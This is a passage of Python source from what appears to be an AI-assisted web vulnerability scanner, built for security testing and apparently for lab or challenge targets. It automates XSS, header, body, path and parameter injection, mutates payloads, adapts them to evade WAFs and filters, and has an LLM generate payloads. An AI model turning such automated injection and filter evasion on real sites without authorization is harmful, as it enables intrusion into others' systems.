                if self.memory.was_tested(base_url, dedup_param, "xss_reflected"):
                    continue

                test_data = {param: payload}
                for k, v in existing_params.items():
                    if k != param:
                        test_data[k] = v[0] if isinstance(v, list) else v

                test_resp = await self._make_request(base_url, method, test_data,
                                                      follow_redirects=follow)
                if not test_resp:
                    self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], False)
                    continue

                # Check with tester
                detected, confidence, evidence = tester.analyze_response(
                    payload, test_resp.get("status", 0),
                    test_resp.get("headers", {}),
                    test_resp.get("body", ""), {}
                )

                if detected and confidence >= 0.7:
                    await self.log("warning", f"    [{param}] [XSS REFLECTED] Phase tester confirmed "
                                  f"(conf={confidence:.2f}): {evidence[:60]}")

                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        "xss_reflected", url, param, payload, evidence, test_resp
                    )
                    if finding:
                        # XSS Browser Validation: Playwright alert/cookie/DOM check
                        if HAS_XSS_VALIDATOR and self.xss_validator and hasattr(self, 'browser') and self.browser:
                            try:
                                test_url = f"{base_url}?{param}={payload}" if method.upper() == "GET" else base_url
                                xss_proof = await self.xss_validator.validate_xss(
                                    test_url, param, payload, "reflected", self.browser
                                )
                                if xss_proof and xss_proof.proven:
                                    finding.proof_of_execution = (
                                        f"Browser validated: {xss_proof.proof_type}"
                                    )
                                    finding.confidence_score = min(
                                        100, (finding.confidence_score or 60) + 20
                                    )
                                    await self.log("info", f"    [{param}] [XSS] Browser proof: {xss_proof.proof_type}")
                            except Exception as e:
                                await self.log("debug", f"    [{param}] [XSS] Browser validation error: {e}")

                        await self.log("warning", f"    [{param}] [XSS REFLECTED] CONFIRMED: {payload[:50]}")
                        self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], True)
                        return finding

                # Track near-misses for mutation retry
                if detected and confidence >= 0.5:
                    if not hasattr(self, '_xss_near_misses'):
                        self._xss_near_misses = []
                    self._xss_near_misses.append(payload)

                self.memory.record_test(base_url, dedup_param, "xss_reflected", [payload], False)

            # Phase 2: Mutation retry on near-miss payloads
            near_misses = getattr(self, '_xss_near_misses', [])
            if near_misses and HAS_PAYLOAD_MUTATOR and hasattr(self, 'payload_mutator') and self.payload_mutator:
                await self.log("info", f"    [{param}] [XSS] Phase 2: Mutating {len(near_misses)} near-miss payloads")
                for near_payload in near_misses[:3]:
                    if self.is_cancelled():
                        break
                    try:
                        mutations = self.payload_mutator.mutate(near_payload, filter_map)
                    except Exception:
                        mutations = []
                    for mutated in mutations[:5]:
                        if self.is_cancelled():
                            break
                        mut_hash = hashlib.md5(mutated.encode()).hexdigest()[:8]
                        dedup_mut = f"{param}|{mut_hash}"
                        if self.memory.was_tested(base_url, dedup_mut, "xss_reflected"):
                            continue

                        test_data = {param: mutated}
                        for k, v in existing_params.items():
                            if k != param:
                                test_data[k] = v[0] if isinstance(v, list) else v

                        test_resp = await self._make_request(base_url, method, test_data,
                                                              follow_redirects=follow)
                        if not test_resp:
                            self.memory.record_test(base_url, dedup_mut, "xss_reflected", [mutated], False)
                            continue

                        detected, confidence, evidence = tester.analyze_response(
                            mutated, test_resp.get("status", 0),
                            test_resp.get("headers", {}),
                            test_resp.get("body", ""), {}
                        )
                        if detected and confidence >= 0.7:
                            finding = await self._judge_finding(
                                "xss_reflected", url, param, mutated, evidence, test_resp
                            )
                            if finding:
                                finding.evidence += f" [Mutated from: {near_payload[:40]}]"
                                await self.log("warning", f"    [{param}] [XSS] CONFIRMED via mutation: {mutated[:50]}")
                                self.memory.record_test(base_url, dedup_mut, "xss_reflected", [mutated], True)
                                self._xss_near_misses = []
                                return finding
                        self.memory.record_test(base_url, dedup_mut, "xss_reflected", [mutated], False)
            self._xss_near_misses = []

        return None

    async def _test_vulnerability_type(self, url: str, vuln_type: str,
                                        method: str = "GET", params: List[str] = None,
                                        form_defaults: Dict = None) -> Optional[Finding]:
        """Test for a specific vulnerability type with correct injection routing."""
        if self.is_cancelled():
            return None

        # Adaptive learner: skip tests with consistent FP pattern
        if self.adaptive_learner:
            try:
                parsed = urlparse(url)
                test_params = params or list(parse_qs(parsed.query).keys()) or [""]
                for p in test_params[:1]:
                    should_skip, reason = self.adaptive_learner.should_skip_test(vuln_type, url, p)
                    if should_skip:
                        await self.log("info", f"  [LEARNER] Skipping {vuln_type} on {url} param={p}: {reason}")
                        return None
            except Exception:
                pass

        # Enrich testing with playbook methodology
        playbook_context = ""
        if HAS_PLAYBOOK:
            try:
                entry = get_playbook_entry(vuln_type)
                if entry:
                    prompts = get_testing_prompts(vuln_type)
                    bypass = get_bypass_strategies(vuln_type)
                    anti_fp = get_anti_fp_rules(vuln_type)
                    playbook_context = f"\n\n--- PLAYBOOK METHODOLOGY ---\n"
                    playbook_context += f"Overview: {entry.get('overview', '')}\n"
                    if prompts:
                        playbook_context += f"Testing prompts ({len(prompts)}):\n"
                        for p in prompts[:5]:  # Top 5 prompts
                            playbook_context += f"  - {p}\n"
                    if bypass:
                        playbook_context += f"Bypass strategies: {', '.join(bypass[:5])}\n"
                    if anti_fp:
                        playbook_context += f"Anti-FP: {', '.join(anti_fp[:3])}\n"
            except Exception:
                pass
        # Store for downstream AI calls within this test cycle
        self._current_playbook_context = playbook_context

        payloads = self._get_payloads(vuln_type)

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Check injection routing table for this vuln type
        injection_config = self.VULN_INJECTION_POINTS.get(vuln_type, {"point": "parameter"})
        injection_point = injection_config["point"]

        # ── Header-based injection (CRLF, host header, etc.) ──
        if injection_point == "header":
            header_names = injection_config.get("headers", ["X-Forwarded-For"])
            return await self._test_header_injection(
                base_url, vuln_type, payloads, header_names, method
            )

        # ── Body-based injection (XXE) ──
        if injection_point == "body":
            return await self._test_body_injection(
                base_url, vuln_type, payloads, method
            )

        # ── Both parameter AND path injection (LFI, path traversal) ──
        if injection_point == "both":
            existing_params = parse_qs(parsed.query) if parsed.query else {}
            # For POST forms, merge defaults so all required fields are sent
            if form_defaults and method.upper() != "GET":
                for k, v in form_defaults.items():
                    if k not in existing_params:
                        existing_params[k] = v
            test_params = params or list(existing_params.keys()) or ["file", "path", "page", "include", "id"]
            # Try parameter injection first
            result = await self._test_param_injection(
                base_url, url, vuln_type, payloads, test_params, existing_params, method
            )
            if result:
                return result
            # Then try path-based injection
            return await self._test_path_injection(base_url, vuln_type, payloads, method)

        # ── Default: Parameter-based injection ──
        existing_params = parse_qs(parsed.query) if parsed.query else {}
        # For POST forms, merge defaults so all required fields are sent
        if form_defaults and method.upper() != "GET":
            for k, v in form_defaults.items():
                if k not in existing_params:
                    existing_params[k] = v
        test_params = params or list(existing_params.keys()) or ["id", "q", "search"]
        return await self._test_param_injection(
            base_url, url, vuln_type, payloads, test_params, existing_params, method
        )

    async def _test_header_injection(self, base_url: str, vuln_type: str,
                                      payloads: List[str], header_names: List[str],
                                      method: str) -> Optional[Finding]:
        """Test payloads via HTTP header injection."""
        for header_name in header_names:
            for payload in payloads[:8]:
                if self.is_cancelled():
                    return None
                dedup_key = f"{header_name}:{vuln_type}"
                if self.memory.was_tested(base_url, header_name, vuln_type):
                    continue

                try:
                    # Baseline without injection
                    baseline_resp = self.memory.get_baseline(base_url)
                    if not baseline_resp:
                        baseline_resp = await self._make_request_with_injection(
                            base_url, method, "test123",
                            injection_point="header", header_name=header_name
                        )
                        if baseline_resp:
                            self.memory.store_baseline(base_url, baseline_resp)

                    # Test with payload in header
                    test_resp = await self._make_request_with_injection(
                        base_url, method, payload,
                        injection_point="header", header_name=header_name
                    )

                    if not test_resp:
                        self.memory.record_test(base_url, header_name, vuln_type, [payload], False)
                        continue

                    # Verify: check if payload appears in response headers or body
                    is_vuln, evidence = await self._verify_vulnerability(
                        vuln_type, payload, test_resp, baseline_resp
                    )

                    # Also check for CRLF-specific indicators in response headers
                    if not is_vuln and vuln_type in ("crlf_injection", "header_injection"):
                        resp_headers = test_resp.get("headers", {})
                        resp_headers_str = str(resp_headers)
                        # Check if injected header value leaked into response
                        if any(ind in resp_headers_str.lower() for ind in
                               ["injected", "set-cookie", "x-injected", payload[:20].lower()]):
                            is_vuln = True
                            evidence = f"Header injection via {header_name}: payload reflected in response headers"

                    if is_vuln:
                        # Run through ValidationJudge pipeline
                        finding = await self._judge_finding(
                            vuln_type, base_url, header_name, payload, evidence, test_resp,
                            baseline=baseline_resp, injection_point="header"
                        )
                        if not finding:
                            self.memory.record_test(base_url, header_name, vuln_type, [payload], False)
                            continue

                        self.memory.record_test(base_url, header_name, vuln_type, [payload], True)
                        return finding

                    self.memory.record_test(base_url, header_name, vuln_type, [payload], False)

                except Exception as e:
                    await self.log("debug", f"Header injection test error: {e}")

        return None

    async def _test_body_injection(self, base_url: str, vuln_type: str,
                                    payloads: List[str], method: str) -> Optional[Finding]:
        """Test payloads via HTTP body injection (XXE, etc.)."""
        for payload in payloads[:8]:
            if self.is_cancelled():
                return None
            if self.memory.was_tested(base_url, "body", vuln_type):
                continue

            try:
                test_resp = await self._make_request_with_injection(
                    base_url, "POST", payload,
                    injection_point="body", param_name="data"
                )
                if not test_resp:
                    self.memory.record_test(base_url, "body", vuln_type, [payload], False)
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, base_url, "body", payload, evidence, test_resp,
                        injection_point="body"
                    )
                    if finding:
                        self.memory.record_test(base_url, "body", vuln_type, [payload], True)
                        return finding

                self.memory.record_test(base_url, "body", vuln_type, [payload], False)

            except Exception as e:
                await self.log("debug", f"Body injection test error: {e}")

        return None

    async def _test_path_injection(self, base_url: str, vuln_type: str,
                                    payloads: List[str], method: str) -> Optional[Finding]:
        """Test payloads via URL path injection (path traversal, LFI)."""
        for payload in payloads[:6]:
            if self.is_cancelled():
                return None
            if self.memory.was_tested(base_url, "path", vuln_type):
                continue

            try:
                test_resp = await self._make_request_with_injection(
                    base_url, method, payload,
                    injection_point="path"
                )
                if not test_resp:
                    self.memory.record_test(base_url, "path", vuln_type, [payload], False)
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, test_resp, None
                )

                if is_vuln:
                    # Run through ValidationJudge pipeline
                    finding = await self._judge_finding(
                        vuln_type, base_url, "path", payload, evidence, test_resp,
                        injection_point="path"
                    )
                    if finding:
                        self.memory.record_test(base_url, "path", vuln_type, [payload], True)
                        return finding

                self.memory.record_test(base_url, "path", vuln_type, [payload], False)

            except Exception as e:
                await self.log("debug", f"Path injection test error: {e}")

        return None

    async def _test_param_injection(self, base_url: str, url: str, vuln_type: str,
                                     payloads: List[str], test_params: List[str],
                                     existing_params: Dict, method: str) -> Optional[Finding]:
        """Test payloads via URL parameter injection (default injection method)."""
        # WAF adaptation: apply bypass techniques to ALL payloads when WAF detected
        if self._waf_result and self._waf_result.detected_wafs and self.waf_detector:
            try:
                payloads = self.waf_detector.adapt_payload_set_with_originals(
                    payloads, waf_result=self._waf_result, vuln_type=vuln_type
                )
            except Exception:
                pass

        for payload in payloads[:8]:
            for param in test_params[:5]:
                if self.is_cancelled():
                    return None
                # Skip if already tested (memory-backed dedup)
                if self.memory.was_tested(base_url, param, vuln_type):
                    continue

                try:
                    # Build request
                    test_data = {**existing_params, param: payload}

                    # Get or reuse cached baseline response
                    baseline_resp = self.memory.get_baseline(base_url)
                    if not baseline_resp:
                        baseline_resp = await self._make_request(base_url, method, {param: "test123"})
                        if baseline_resp:
                            self.memory.store_baseline(base_url, baseline_resp)
                            self.memory.store_fingerprint(base_url, baseline_resp)

                    # Test with payload
                    test_resp = await self._make_request(base_url, method, test_data)

                    if not test_resp:
                        self.memory.record_test(base_url, param, vuln_type, [payload], False)
                        continue

                    # Check for vulnerability
                    is_vuln, evidence = await self._verify_vulnerability(
                        vuln_type, payload, test_resp, baseline_resp
                    )

                    if is_vuln:
                        # Run through ValidationJudge pipeline
                        finding = await self._judge_finding(
                            vuln_type, url, param, payload, evidence, test_resp,
                            baseline=baseline_resp
                        )
                        if not finding:
                            self.memory.record_test(base_url, param, vuln_type, [payload], False)
                            continue

                        self.memory.record_test(base_url, param, vuln_type, [payload], True)

                        # Multi-method testing: check if other HTTP methods are also vulnerable
                        try:
                            multi_results = await self._test_multi_method(
                                url, param, payload, vuln_type, method
                            )
                            for mf in multi_results:
                                await self._add_finding(mf)
                        except Exception:
                            pass

                        return finding

                    self.memory.record_test(base_url, param, vuln_type, [payload], False)

                except asyncio.TimeoutError:
                    self.memory.record_test(base_url, param, vuln_type, [payload], False)
                    # Timeout might indicate blind injection - only if significant delay
                    if vuln_type in ("sqli_time", "sqli") and "SLEEP" in payload.upper():
                        self.memory.record_test(base_url, param, vuln_type, [payload], True)
                        return self._create_finding(
                            vuln_type, url, param, payload,
                            "Request timeout - possible time-based blind SQLi",
                            {"status": "timeout"},
                            ai_confirmed=False
                        )
                except Exception as e:
                    await self.log("debug", f"Test error: {e}")

        return None

    async def _test_multi_method(self, url: str, param: str, payload: str,
                                  vuln_type: str, original_method: str = "GET") -> List:
        """Test same payload across GET/POST/PUT/PATCH/DELETE.

        Called after a vulnerability is found via one method to check if
        other HTTP methods are also vulnerable (method-specific auth bypass).
        """
        methods_to_test = ["GET", "POST", "PUT", "PATCH", "DELETE"]
        # Remove the method that already found the vuln
        methods_to_test = [m for m in methods_to_test if m != original_method.upper()]

        additional_findings = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for method in methods_to_test:
            if self.is_cancelled():
                break

            dedup_key = f"{param}|{method}|{vuln_type}"
            if self.memory.was_tested(base_url, dedup_key, vuln_type):
                continue

            try:
                resp = await self._make_request(base_url, method, {param: payload},
                                                  follow_redirects=True)
                if not resp or resp.get("status", 0) == 405:
                    self.memory.record_test(base_url, dedup_key, vuln_type, [payload], False)
                    continue

                is_vuln, evidence = await self._verify_vulnerability(
                    vuln_type, payload, resp, None
                )

                if is_vuln:
                    finding = self._create_finding(
                        vuln_type, url, param, payload,
                        f"[{method}] {evidence}",
                        resp, ai_confirmed=False
                    )
                    finding.request = f"{method} {url}"
                    additional_findings.append(finding)
                    self.memory.record_test(base_url, dedup_key, vuln_type, [payload], True)
                    await self.log("info", f"    [MULTI-METHOD] {vuln_type} also found via {method}")
                else:
                    self.memory.record_test(base_url, dedup_key, vuln_type, [payload], False)

            except Exception:
                self.memory.record_test(base_url, dedup_key, vuln_type, [payload], False)

        return additional_findings

    async def _store_rejected_finding(self, vuln_type: str, url: str, param: str,
                                       payload: str, evidence: str, test_resp: Dict):
        """Store a rejected finding for manual review."""
        await self.log("debug", f"  Finding rejected after verification: {vuln_type} in {param}")
        rejected = self._create_finding(
            vuln_type, url, param, payload, evidence, test_resp,
            ai_confirmed=False
        )
        rejected.ai_status = "rejected"
        rejected.rejection_reason = f"AI verification rejected: {vuln_type} in {param} - payload detected but not confirmed exploitable"
        self.rejected_findings.append(rejected)
        self.memory.reject_finding(rejected, rejected.rejection_reason)
        if self.finding_callback:
            try:
                await self.finding_callback(asdict(rejected))
            except Exception:
                pass

    # ── Stored XSS: Two-phase form-based testing ──────────────────────────

    def _get_display_pages(self, form: Dict) -> List[str]:
        """Determine likely display pages where stored content would render."""
        display_pages = []
        action = form.get("action", "")
        page_url = form.get("page_url", "")

        # 1. The page containing the form (most common: comments appear on same page)
        if page_url and page_url not in display_pages:
            display_pages.append(page_url)

        # 2. Form action URL (sometimes redirects back to content page)
        if action and action not in display_pages:
            display_pages.append(action)

        # 3. Parent path (e.g., /post/comment → /post)
        parsed = urlparse(page_url or action)
        parent = parsed.path.rsplit("/", 1)[0]
        if parent and parent != parsed.path:
            parent_url = f"{parsed.scheme}://{parsed.netloc}{parent}"
            if parent_url not in display_pages:
                display_pages.append(parent_url)

        # 4. Main target
        if self.target not in display_pages:
            display_pages.append(self.target)

        return display_pages

    async def _fetch_fresh_form_values(self, page_url: str, form_action: str) -> List[Dict]:
        """Fetch a page and extract fresh hidden input values (CSRF tokens, etc.)."""
        try:
            resp = await self._make_request(page_url, "GET", {})
            if not resp:
                return []
            body = resp.get("body", "")

            # Capture <form> tag attributes and inner content separately
            form_pattern = r'<form([^>]*)>(.*?)</form>'
            forms = re.findall(form_pattern, body, re.I | re.DOTALL)

            parsed_action = urlparse(form_action)
            for form_attrs, form_html in forms:
                # Match action from the <form> tag attributes
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_attrs, re.I)
                if action_match:
                    found_action = action_match.group(1)
                    if found_action == parsed_action.path or form_action.endswith(found_action):
                        # Extract fresh input values from inner content
                        details = []
                        for inp_el in re.findall(r'<input[^>]*>', form_html, re.I):
                            name_m = re.search(r'name=["\']([^"\']+)["\']', inp_el, re.I)
                            if not name_m:
                                continue
                            type_m = re.search(r'type=["\']([^"\']+)["\']', inp_el, re.I)
                            val_m = re.search(r'value=["\']([^"\']*)["\']', inp_el, re.I)
                            details.append({
                                "name": name_m.group(1),
                                "type": type_m.group(1).lower() if type_m else "text",
                                "value": val_m.group(1) if val_m else ""
                            })
                        for ta in re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_html, re.I):
                            details.append({"name": ta, "type": "textarea", "value": ""})
                        return details
        except Exception:
            pass
        return []

    async def _test_stored_xss(self, form: Dict) -> Optional[Finding]:
        """AI-driven two-phase stored XSS testing for a form.

        Phase 1: Submit XSS payloads to form action (with fresh CSRF tokens)
        Phase 2: Check display pages for unescaped payload execution
        Uses AI to analyze form structure, adapt payloads, and verify results.
        """
        action = form.get("action", "")
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", [])
        input_details = form.get("input_details", [])
        page_url = form.get("page_url", action)

        if not action or not inputs:
            return None

        # Use page_url as unique key for dedup (not action, which may be shared)
        dedup_key = page_url or action

        await self.log("info", f"  [STORED XSS] Testing form on {page_url[:60]}...")
        await self.log("info", f"    Action: {action[:60]}, Method: {method}, Inputs: {inputs}")

        # Check for CSRF-protected forms
        has_csrf = any(
            d.get("type") == "hidden" and "csrf" in d.get("name", "").lower()
            for d in input_details if isinstance(d, dict)
        )

        # Identify hidden fields and their values
        hidden_fields = {}
        for d in input_details:
            if isinstance(d, dict) and d.get("type") == "hidden":
                hidden_fields[d["name"]] = d.get("value", "")
        if hidden_fields:
            await self.log("info", f"    [HIDDEN] {list(hidden_fields.keys())} (CSRF={has_csrf})")

        display_pages = self._get_display_pages(form)

        # Identify injectable text fields (skip hidden/submit)
        text_fields = []
        text_indicators = [
            "comment", "message", "text", "body", "content", "desc",
            "title", "subject", "review", "feedback", "note",
            "post", "reply", "bio", "about",
        ]
        for inp_d in input_details:
            if isinstance(inp_d, dict):
                name = inp_d.get("name", "")
                inp_type = inp_d.get("type", "text")
                if inp_type in ("hidden", "submit"):
                    continue
                if inp_type == "textarea" or any(ind in name.lower() for ind in text_indicators):
                    text_fields.append(name)

        # Fallback: use all non-hidden, non-submit inputs
        if not text_fields:
            for inp_d in input_details:
                if isinstance(inp_d, dict) and inp_d.get("type") not in ("hidden", "submit"):
                    text_fields.append(inp_d.get("name", ""))

        if not text_fields:
            await self.log("debug", f"    No injectable text fields found")
            return None

        await self.log("info", f"    [FIELDS] Injectable: {text_fields}")

        # ── Step 1: Canary probe to verify form submission works ──
        canary = f"xsscanary{hashlib.md5(page_url.encode()).hexdigest()[:6]}"
        canary_stored = False
        canary_display_url = None
        context = "unknown"

        fresh_details = await self._fetch_fresh_form_values(page_url, action) if has_csrf else input_details
        if not fresh_details:
            fresh_details = input_details

        probe_data = self._build_form_data(fresh_details, text_fields, canary)
        await self.log("info", f"    [PROBE] Submitting canary '{canary}' to verify form works...")
        await self.log("debug", f"    [PROBE] POST data keys: {list(probe_data.keys())}")

        try:
            probe_resp = await self._make_request(action, method, probe_data)
            if probe_resp:
                p_status = probe_resp.get("status", 0)
                p_body = probe_resp.get("body", "")
                await self.log("info", f"    [PROBE] Response: status={p_status}, body_len={len(p_body)}")

                # Check if canary appears in the response itself (immediate display)
                if canary in p_body:
                    await self.log("info", f"    [PROBE] Canary found in submission response!")
                    canary_stored = True
                    canary_display_url = action

                # Follow redirect
                if p_status in (301, 302, 303):
                    loc = probe_resp.get("headers", {}).get("Location", "")
                    await self.log("info", f"    [PROBE] Redirect to: {loc}")
                    if loc:
                        if loc.startswith("/"):
                            parsed = urlparse(action)
                            loc = f"{parsed.scheme}://{parsed.netloc}{loc}"
                        if loc not in display_pages:
                            display_pages.insert(0, loc)
                        # Follow the redirect to check for canary
                        redir_resp = await self._make_request(loc, "GET", {})
                        if redir_resp and canary in redir_resp.get("body", ""):
                            await self.log("info", f"    [PROBE] Canary found on redirect page!")
                            canary_stored = True
                            canary_display_url = loc

                # Check display pages for canary
                if not canary_stored:
                    for dp_url in display_pages:
                        dp_resp = await self._make_request(dp_url, "GET", {})
                        if dp_resp and canary in dp_resp.get("body", ""):
                            await self.log("info", f"    [PROBE] Canary found on display page: {dp_url[:60]}")
                            canary_stored = True
                            canary_display_url = dp_url
                            break
                        elif dp_resp:
                            await self.log("debug", f"    [PROBE] Canary NOT found on {dp_url[:60]} (body_len={len(dp_resp.get('body',''))})")

                if not canary_stored:
                    await self.log("warning", f"    [PROBE] Canary not found on any display page - form may not store data")
                    # Try AI analysis of why submission might have failed
                    if self.llm.is_available() and p_body:
                        ai_hint = await self.llm.generate(
                            f"I submitted a form to {action} with fields {list(probe_data.keys())}. "
                            f"Got status {p_status}. Response body excerpt:\n{p_body[:1500]}\n\n"
                            f"Did the submission succeed? If not, what's wrong? "
                            f"Look for error messages, missing fields, validation failures. "
                            f"Reply in 1-2 sentences.",
                            self._get_enhanced_system_prompt("interpretation", vuln_type="xss_stored")
                        )
                        await self.log("info", f"    [AI] Form analysis: {ai_hint[:150]}")
                    return None  # Don't waste time if form doesn't store

        except Exception as e:
            await self.log("debug", f"    Context probe failed: {e}")
            return None

        # ── Step 2: Enhanced context detection ──
        context_info = {"context": "html_body"}
        if canary_display_url:
            try:
                ctx_resp = await self._make_request(canary_display_url, "GET", {})
                if ctx_resp and canary in ctx_resp.get("body", ""):
                    context_info = self._detect_xss_context_enhanced(ctx_resp["body"], canary)
                    await self.log("info", f"    [CONTEXT] Detected: {context_info['context']} "
                                  f"(tag={context_info.get('enclosing_tag', 'none')}, "
                                  f"attr={context_info.get('attribute_name', 'none')})")
            except Exception:
                pass

        context = context_info["context"]

        # ── Step 2.5: Filter detection ──
        form_context_for_filter = {
            "text_fields": text_fields,
            "input_details": input_details,
            "action": action,
            "method": method,
            "display_url": canary_display_url or page_url,
            "page_url": page_url,
            "has_csrf": has_csrf,
        }
        filter_map = await self._detect_xss_filters(
            page_url, text_fields[0] if text_fields else "",
            form_context=form_context_for_filter
        )

        # ── Step 3: Build adaptive payload list ──
        # 3a: Context payloads from PayloadGenerator
        context_payloads = self.payload_generator.get_context_payloads(context)

        # 3b: Escalation payloads filtered by what's allowed
        escalation = self._escalation_payloads(filter_map, context)

        # 3c: Filter bypass payloads from generator
        bypass_payloads = self.payload_generator.get_filter_bypass_payloads(filter_map)

        # 3d: AI-generated payloads
        challenge_hint = self.lab_context.get("challenge_name", "") or ""
        if self.lab_context.get("notes"):
            challenge_hint += f" | {self.lab_context['notes']}"
        ai_payloads = await self._ai_generate_xss_payloads(
            filter_map, context_info, challenge_hint
        )

        # Merge and deduplicate: AI first (most targeted), then escalation, then static
        seen: set = set()
        payloads: List[str] = []
        for p in (ai_payloads + escalation + bypass_payloads + context_payloads):
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        if not payloads:
            payloads = self._get_payloads("xss_stored")

        await self.log("info", f"    [PAYLOADS] {len(payloads)} total "
                       f"(AI={len(ai_payloads)}, escalation={len(escalation)}, "
                       f"bypass={len(bypass_payloads)}, context={len(context_payloads)})")

        # ── Step 4: Submit payloads and verify on display page ──
        tester = self.vuln_registry.get_tester("xss_stored")
        param_key = ",".join(text_fields)

        for i, payload in enumerate(payloads[:15]):
            await self._wait_if_paused()
            if self.is_cancelled():
                return None

            # Per-payload dedup using page_url (not action, which is shared across forms)
            payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
            dedup_param = f"{param_key}|{payload_hash}"
            if self.memory.was_tested(dedup_key, dedup_param, "xss_stored"):
                continue

            # Fetch fresh CSRF token for each submission
            current_details = input_details
            if has_csrf:
                fetched = await self._fetch_fresh_form_values(page_url, action)
                if fetched:
                    current_details = fetched

            form_data = self._build_form_data(current_details, text_fields, payload)

            try:
                # Phase 1: Submit payload
                submit_resp = await self._make_request(action, method, form_data)
                if not submit_resp:
                    self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)
                    continue

                s_status = submit_resp.get("status", 0)
                s_body = submit_resp.get("body", "")

                if s_status >= 400:
                    await self.log("debug", f"    [{i+1}] Phase 1 rejected (status {s_status})")
                    self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)
                    continue

                await self.log("info", f"    [{i+1}] Phase 1 OK (status={s_status}): {payload[:50]}...")

                # Phase 2: Check where the payload ended up
                # Start with the known display URL from canary, then check others
                check_urls = []
                if canary_display_url:
                    check_urls.append(canary_display_url)
                # Follow redirect
                if s_status in (301, 302, 303):
                    loc = submit_resp.get("headers", {}).get("Location", "")
                    if loc:
                        if loc.startswith("/"):
                            parsed = urlparse(action)
                            loc = f"{parsed.scheme}://{parsed.netloc}{loc}"
                        if loc not in check_urls:
                            check_urls.append(loc)
                # Add remaining display pages
                for dp in display_pages:
                    if dp not in check_urls:
                        check_urls.append(dp)

                for dp_url in check_urls:
                    try:
                        dp_resp = await self._make_request(dp_url, "GET", {})
                        if not dp_resp:
                            continue

                        dp_body = dp_resp.get("body", "")

                        # Check with tester
                        phase2_detected, phase2_conf, phase2_evidence = tester.analyze_display_response(
                            payload, dp_resp.get("status", 0),
                            dp_resp.get("headers", {}),
                            dp_body, {}
                        )

                        if phase2_detected and phase2_conf >= 0.7:
                            await self.log("warning",
                                f"    [{i+1}] [XSS STORED] Phase 2 CONFIRMED (conf={phase2_conf:.2f}): {phase2_evidence[:80]}")

                            # For stored XSS with high-confidence Phase 2 tester match,
                            # skip the generic AI confirmation — the tester already verified
                            # the payload exists unescaped on the display page.
                            # The AI prompt doesn't understand two-phase stored XSS context
                            # and rejects legitimate findings because it only sees a page excerpt.
                            await self.log("info", f"    [{i+1}] Phase 2 tester confirmed with {phase2_conf:.2f} — accepting finding")

                            # Browser verification if available
                            browser_evidence = ""
                            screenshots = []
                            if HAS_PLAYWRIGHT and BrowserValidator is not None:
                                browser_result = await self._browser_verify_stored_xss(
                                    form, payload, text_fields, dp_url
                                )
                                if browser_result:
                                    browser_evidence = browser_result.get("evidence", "")
                                    screenshots = [s for s in browser_result.get("screenshots", []) if s]
                                    if browser_result.get("xss_confirmed"):
                                        await self.log("warning", "    [BROWSER] Stored XSS confirmed!")

                            evidence = phase2_evidence
                            if browser_evidence:
                                evidence += f" | Browser: {browser_evidence}"

                            self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], True)

                            finding = self._create_finding(
                                "xss_stored", dp_url, param_key, payload,
                                evidence, dp_resp, ai_confirmed=True
                            )
                            finding.affected_urls = [action, dp_url]

                            # XSS Browser Validation: Playwright alert/cookie/DOM check
                            if HAS_XSS_VALIDATOR and self.xss_validator and hasattr(self, 'browser') and self.browser:
                                try:
                                    xss_proof = await self.xss_validator.validate_xss(
                                        dp_url, param_key, payload, "stored", self.browser
                                    )
                                    if xss_proof and xss_proof.proven:
                                        finding.proof_of_execution = (
                                            f"Browser validated: {xss_proof.proof_type}"
                                        )
                                        finding.confidence_score = min(
                                            100, (finding.confidence_score or 60) + 20
                                        )
                                        await self.log("info", f"    [XSS] Browser proof: {xss_proof.proof_type}")
                                except Exception:
                                    pass

                            if screenshots and embed_screenshot:
                                for ss_path in screenshots:
                                    data_uri = embed_screenshot(ss_path)
                                    if data_uri:
                                        finding.screenshots.append(data_uri)

                            return finding
                        else:
                            # Log what we found (or didn't)
                            if payload in dp_body:
                                await self.log("info", f"    [{i+1}] Payload found on page but encoded/safe (conf={phase2_conf:.2f})")
                            else:
                                await self.log("debug", f"    [{i+1}] Payload NOT on display page {dp_url[:50]}")

                    except Exception as e:
                        await self.log("debug", f"    [{i+1}] Display page error: {e}")

                self.memory.record_test(dedup_key, dedup_param, "xss_stored", [payload], False)

            except Exception as e:
                await self.log("debug", f"    [{i+1}] Stored XSS error: {e}")

        return None

    def _build_form_data(self, input_details: List[Dict], text_fields: List[str],
                         payload_value: str) -> Dict[str, str]:
        """Build form submission data using hidden field values and injecting payload into text fields."""
        form_data = {}
        for inp in input_details:
            name = inp.get("name", "") if isinstance(inp, dict) else inp
            inp_type = inp.get("type", "text") if isinstance(inp, dict) else "text"
            inp_value = inp.get("value", "") if isinstance(inp, dict) else ""

            if inp_type == "hidden":
                # Use actual hidden value (csrf token, postId, etc.)
                form_data[name] = inp_value
            elif name in text_fields:
                form_data[name] = payload_value
            elif name.lower() in ("email",):
                form_data[name] = "test@test.com"
            elif name.lower() in ("website", "url"):
                form_data[name] = "http://test.com"
            elif name.lower() in ("name",):
                form_data[name] = "TestUser"
            elif inp_type == "textarea":
                form_data[name] = payload_value
            else:
                form_data[name] = inp_value if inp_value else "test"
        return form_data

    # ==================== ADAPTIVE XSS ENGINE ====================

    def _detect_xss_context_enhanced(self, body: str, canary: str) -> Dict[str, Any]:
        """Enhanced XSS context detection supporting 12+ injection contexts.

        Returns dict with: context, before_context, after_context, enclosing_tag,
        attribute_name, quote_char, can_break_out
        """
        result = {
            "context": "unknown",
            "before_context": "",
            "after_context": "",
            "enclosing_tag": "",
            "attribute_name": "",
            "quote_char": "",
            "can_break_out": True,
        }

        idx = body.find(canary)
        if idx == -1:
            return result

